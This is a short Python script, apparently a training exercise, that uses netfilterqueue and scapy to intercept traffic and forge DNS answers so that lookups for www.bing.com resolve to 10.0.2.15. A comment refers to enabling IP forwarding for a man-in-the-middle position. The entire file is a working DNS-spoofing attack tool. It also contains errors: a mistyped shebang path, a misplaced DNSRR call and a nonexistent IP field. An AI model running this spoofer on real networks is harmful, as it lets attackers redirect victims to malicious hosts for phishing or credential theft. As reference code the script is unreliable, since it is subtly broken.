#! /ur/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    print("inside process_packet")
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            scapy_packet[scapy.DNS].an = scapy_packet.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].length
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


# check whether /proc/sys/net/ipv4/ip_forward file is set to 1

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
